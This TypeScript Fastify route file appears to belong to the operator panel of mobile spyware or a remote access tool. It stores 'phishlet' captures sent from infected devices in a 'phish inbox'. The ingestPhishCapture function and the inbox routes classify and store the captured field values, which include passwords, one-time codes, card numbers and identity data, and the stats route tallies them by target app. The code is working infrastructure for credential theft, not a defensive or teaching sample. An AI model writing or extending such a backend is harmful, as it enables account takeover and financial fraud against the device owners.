import type { FastifyInstance } from 'fastify';
import { getDb } from '../db/index.js';
import { phishInbox, clients } from '../db/schema.js';
import { eq, desc, and, sql } from 'drizzle-orm';
import { requirePermission, getRequestUser } from '../middleware/auth.js';
import { classifyCapture, classifyForm } from '../utils/phishClassifier.js';

export async function phishInboxRoutes(app: FastifyInstance) {
  // List inbox — with filters
  app.get('/api/phish-inbox', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request) => {
    const { unread, category, captureType, clientId, starred, search } = request.query as any;
    const d = getDb();
    let query = d.select().from(phishInbox);

    const conditions = [];
    if (unread === 'true') conditions.push(eq(phishInbox.read, false));
    if (starred === 'true') conditions.push(eq(phishInbox.starred, true));
    if (category) conditions.push(eq(phishInbox.appCategory, category));
    if (captureType) conditions.push(eq(phishInbox.captureType, captureType));
    if (clientId) conditions.push(eq(phishInbox.clientId, clientId));
    if (search) {
      conditions.push(sql`(${phishInbox.appName} LIKE ${'%' + search + '%'} OR ${phishInbox.fieldName} LIKE ${'%' + search + '%'} OR ${phishInbox.fieldValue} LIKE ${'%' + search + '%'})`);
    }

    let rows;
    if (conditions.length > 0) {
      rows = d.select().from(phishInbox).where(and(...conditions)).orderBy(desc(phishInbox.createdAt)).all();
    } else {
      rows = d.select().from(phishInbox).orderBy(desc(phishInbox.createdAt)).all();
    }
    return { success: true, data: rows };
  });

  // Unread count badge
  app.get('/api/phish-inbox/unread-count', {
    preHandler: [app.auth],
  }, async () => {
    const d = getDb();
    const row = d.select({ count: sql<number>`count(*)` }).from(phishInbox)
      .where(eq(phishInbox.read, false)).get();
    return { success: true, data: { count: row?.count || 0 } };
  });

  // Mark read
  app.post('/api/phish-inbox/:id/read', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request) => {
    const { id } = request.params as { id: string };
    const d = getDb();
    d.update(phishInbox).set({ read: true }).where(eq(phishInbox.id, parseInt(id))).run();
    return { success: true };
  });

  // Mark all read
  app.post('/api/phish-inbox/read-all', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async () => {
    const d = getDb();
    d.update(phishInbox).set({ read: true }).run();
    return { success: true };
  });

  // Toggle star
  app.post('/api/phish-inbox/:id/star', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request) => {
    const { id } = request.params as { id: string };
    const d = getDb();
    const row = d.select().from(phishInbox).where(eq(phishInbox.id, parseInt(id))).get();
    if (row) {
      d.update(phishInbox).set({ starred: !row.starred }).where(eq(phishInbox.id, parseInt(id))).run();
    }
    return { success: true, data: { starred: !row?.starred } };
  });

  // Delete one
  app.delete('/api/phish-inbox/:id', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request) => {
    const { id } = request.params as { id: string };
    const d = getDb();
    d.delete(phishInbox).where(eq(phishInbox.id, parseInt(id))).run();
    return { success: true };
  });

  // Clear all
  app.delete('/api/phish-inbox', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async () => {
    const d = getDb();
    d.delete(phishInbox).run();
    return { success: true };
  });

  // Stats for dashboard widget
  app.get('/api/phish-inbox/stats', {
    preHandler: [app.auth],
  }, async () => {
    const d = getDb();
    const total = d.select({ count: sql<number>`count(*)` }).from(phishInbox).get();
    const passwords = d.select({ count: sql<number>`count(*)` }).from(phishInbox).where(eq(phishInbox.isPassword, true)).get();
    const otps = d.select({ count: sql<number>`count(*)` }).from(phishInbox).where(eq(phishInbox.isOtp, true)).get();
    const cards = d.select({ count: sql<number>`count(*)` }).from(phishInbox).where(eq(phishInbox.isCard, true)).get();
    const unread = d.select({ count: sql<number>`count(*)` }).from(phishInbox).where(eq(phishInbox.read, false)).get();
    const byCategory = d.select({
      category: phishInbox.appCategory,
      count: sql<number>`count(*)`,
    }).from(phishInbox).groupBy(phishInbox.appCategory).all();
    const byApp = d.select({
      app: phishInbox.appName,
      count: sql<number>`count(*)`,
    }).from(phishInbox).groupBy(phishInbox.appName).orderBy(desc(sql`count(*)`)).limit(10).all();

    return {
      success: true,
      data: {
        total: total?.count || 0,
        passwords: passwords?.count || 0,
        otps: otps?.count || 0,
        cards: cards?.count || 0,
        unread: unread?.count || 0,
        byCategory,
        byApp,
      },
    };
  });

  // Classify endpoint — test the classifier live
  app.post('/api/phish-inbox/classify', {
    preHandler: [app.auth],
  }, async (request) => {
    const body = request.body as any;
    const result = classifyCapture(
      body.packageName || '',
      body.fieldName || '',
      body.fieldValue || '',
      body.formData,
    );
    return { success: true, data: result };
  });
}

/** Called from socket handler when device emits phishlet data. */
export function ingestPhishCapture(clientId: string, payload: {
  packageName?: string;
  fieldName?: string;
  fieldValue?: string;
  fieldType?: string;
  formData?: string;
  phishletType?: string;
}) {
  const d = getDb();
  const pkg = payload.packageName || '';
  const formData = payload.formData;

  // If we have full form data, classify and store each field
  if (formData) {
    const fields = classifyForm(pkg, formData);
    for (const f of fields) {
      d.insert(phishInbox).values({
        clientId,
        packageName: pkg,
        appName: f.classification.appName,
        appCategory: f.classification.appCategory,
        captureType: f.classification.captureType,
        fieldName: f.field,
        fieldValue: f.value,
        fieldType: payload.fieldType || 'text',
        formData: formData,
        confidence: f.classification.confidence,
        isPassword: f.classification.isPassword,
        isOtp: f.classification.isOtp,
        isCard: f.classification.isCard,
        isIdentity: f.classification.isIdentity,
      }).run();
    }
    return;
  }

  // Single field capture
  const c = classifyCapture(pkg, payload.fieldName || '', payload.fieldValue || '');
  d.insert(phishInbox).values({
    clientId,
    packageName: pkg,
    appName: c.appName,
    appCategory: c.appCategory,
    captureType: c.captureType,
    fieldName: payload.fieldName || '',
    fieldValue: payload.fieldValue || '',
    fieldType: payload.fieldType || 'text',
    confidence: c.confidence,
    isPassword: c.isPassword,
    isOtp: c.isOtp,
    isCard: c.isCard,
    isIdentity: c.isIdentity,
  }).run();
}
